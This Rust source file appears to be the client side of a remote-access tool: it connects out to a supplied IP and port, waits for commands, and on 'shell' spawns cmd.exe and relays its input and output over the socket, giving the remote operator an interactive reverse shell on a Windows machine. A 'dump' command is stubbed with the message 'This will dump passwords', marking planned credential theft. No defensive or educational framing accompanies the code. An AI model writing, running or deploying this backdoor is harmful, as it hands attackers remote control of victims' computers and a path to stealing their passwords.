use std::io::{Write, BufReader, BufRead, Read, ErrorKind};
use std::net::{TcpStream, Shutdown};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex};
use std::{thread, time};
use std::sync::atomic::{AtomicBool, Ordering};

fn execute_command(cmd: &str) -> String{
    match cmd {
        "dump" => {
            return  String::from("This will dump passwords\n")
        },
        _ => return format!("Unknown Command: {} \n", cmd)
    }
}

pub fn setup(ip: String, port: String) {
    let tcp_stream_address = format!("{}:{}", ip, port);
    let client = Arc::new(Mutex::new(TcpStream::connect(tcp_stream_address).unwrap()));

    let exit_flag = Arc::new(AtomicBool::new(false));

    println!("Connected to: {}", client.lock().unwrap().peer_addr().unwrap());

    loop {

        let mut buffer = Vec::new();

        {
            let client_guard = client.lock().unwrap();
            let mut reader = BufReader::new(&*client_guard);
            reader.read_until(b'\0', &mut buffer).unwrap();
        }

        let command = String::from_utf8_lossy(&buffer).trim_end_matches('\0').to_string();
        if command.trim() == "quit" {
            break;
        }

        if command.trim() == "shell" {
            let powershell_process = Command::new("cmd")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to spawn cmd.exe");

            let powershell_in = Arc::new(Mutex::new(powershell_process.stdin));
            let powershell_out = Arc::new(Mutex::new(powershell_process.stdout));

            let client_to_powershell_exit_flag = Arc::clone(&exit_flag);
            client_to_powershell_exit_flag.store(false, Ordering::Release);

            let client_to_powershell = thread::spawn({
                let c_client = Arc::clone(&client);
                let c_powershell_in = Arc::clone(&powershell_in);
                move || {
                    loop {
                        if client_to_powershell_exit_flag.load(Ordering::Acquire) {
                            break;
                        }
                        thread::sleep(time::Duration::from_millis(10));
                        let mut buf = [0u8; 128];
                        let mut l_client = match c_client.lock() {
                            Ok(lock) => lock,
                            Err(_) => continue,
                        };

                        match l_client.read(&mut buf) {
                            Ok(n) => {
                                let mut l_proc_in = c_powershell_in.lock().unwrap();

                                if let Err(e) = l_proc_in.as_mut().unwrap().write_all(&buf[0..n]) {
                                    if e.kind() == ErrorKind::BrokenPipe {
                                        client_to_powershell_exit_flag.store(true, Ordering::Release);
                                    } else {
                                        client_to_powershell_exit_flag.store(true, Ordering::Release);
                                    }
                                }
                                l_proc_in.as_mut().unwrap().flush().unwrap();
                            },
                            Err(e) => println!("Failed to read data from stream:\n{}", e),
                        }
                    }
                }
            });

            let powershell_to_client_exit_flag = Arc::clone(&exit_flag);
            let powershell_to_client = thread::spawn({
                let c_client = Arc::clone(&client);
                let c_powershell_out = Arc::clone(&powershell_out);
                move || {
                    loop {

                        if powershell_to_client_exit_flag.load(Ordering::Acquire) {
                            break;
                        }
                        let mut buf = [0u8; 128];
                        let mut l_proc_out = c_powershell_out.lock().unwrap();
                        match l_proc_out.as_mut().unwrap().read(&mut buf) {
                            Ok(0) => {
                                powershell_to_client_exit_flag.store(true, Ordering::Release);
                                c_client.lock().unwrap().write_all(String::from("SHELL EXIT\0").as_bytes()).unwrap();
                                break;
                            }
                            Ok(n) => {
                                let mut l_stream = c_client.lock().unwrap();
                                if let Err(e) = l_stream.write_all(&buf[0..n]) {
                                    if e.kind() == ErrorKind::BrokenPipe {
                                        powershell_to_client_exit_flag.store(true, Ordering::Release);
                                    } else {
                                        powershell_to_client_exit_flag.store(true, Ordering::Release);
                                    }
                                }
                                l_stream.flush().unwrap();
                            },
                            Err(e) => println!("Failed to read data from proc:\n{}", e),
                        }
                    }
                }
            });
            client_to_powershell.join().unwrap();
            powershell_to_client.join().unwrap();
        } else {
            let mut output = execute_command(command.as_str());
            output.push('\0');
            client.lock().unwrap().write_all(&output.as_bytes()).unwrap();
        }
    }

    client.lock().unwrap().shutdown(Shutdown::Both).unwrap();
}